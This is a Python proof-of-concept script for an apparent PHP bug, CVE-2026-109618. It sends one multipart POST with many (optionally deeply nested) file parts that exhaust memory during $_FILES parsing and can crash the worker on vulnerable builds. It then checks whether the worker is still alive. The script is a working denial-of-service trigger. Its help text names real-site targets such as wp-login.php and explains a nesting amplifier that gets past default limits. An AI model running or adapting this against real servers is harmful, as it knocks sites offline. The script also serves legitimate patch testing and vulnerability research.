#!/usr/bin/env python3
# INDEX: shutdown-walk of half-built $_files state | cli | startup oom mid-parse
"""parse_oom_halfbuilt.py - CVE-2026-109618 differential trigger.

One multipart POST whose many file parts make request-startup parsing hit the
memory_limit fatal mid-build. On a vulnerable build, request shutdown then walks
the half-built $_FILES state and the worker crashes; on a patched build the OOM
is reported cleanly (soft fatal) and the worker stays alive. The worker-alive
check after the POST is the signal.

Usage:
    python3 -I poc/bugs/parse_oom_halfbuilt.py http://127.0.0.1:8081 [--parts N]
"""
from __future__ import annotations

import argparse
import os
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http, report  # noqa: E402
from common.multipart import multipart_default as multipart  # noqa: E402
from primitives.groom.upload_progress_seed import file_parts  # noqa: E402

def run(args):
    base = args.url.rstrip("/")
    path = "/" + args.path.lstrip("/")
    parts = list(file_parts(args.parts, nest=args.nest, key_len=args.key_len,
                            empty_filename=args.empty_filename))
    body, headers = multipart(parts)
    print(f"[parse_oom_halfbuilt] POST {base}{path}  ({args.parts} parts, nest={args.nest}, "
          f"key_len={args.key_len}, empty_filename={args.empty_filename}, "
          f"{len(body)} wire bytes)")
    t0 = time.time()
    s, b = http(base + path, data=body, headers=headers)
    report("parse_oom_halfbuilt", s, b, base, check_path=path)
    print(f"[parse_oom_halfbuilt] elapsed {time.time() - t0:.1f}s")
    print("[parse_oom_halfbuilt] vulnerable: fatals handled; worker may crash when shutdown walks "
          "half-built state. patched: soft OOM reported cleanly, worker alive.")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    ap.add_argument("--parts", type=int, default=30000)
    ap.add_argument("--path", default="poc.php",
                    help="target path for the POST and the worker-alive check "
                         "(lab: poc.php; a real site: any PHP page, e.g. "
                         "wp-login.php)")
    ap.add_argument("--nest", type=int, default=0,
                    help="nesting depth of part names (f[k][k]...); each level "
                         "allocates ~6 HashTables in $_FILES - the stock-INI "
                         "amplifier (keep <= 64, the default "
                         "max_input_nesting_level)")
    ap.add_argument("--key-len", type=int, default=1,
                    help="length of each nested key string")
    ap.add_argument("--empty-filename", action="store_true",
                    help="use filename=\"\" parts (do not count toward "
                         "max_file_uploads but still build all six $_FILES "
                         "entries)")
    run(ap.parse_args())


if __name__ == "__main__":
    main()
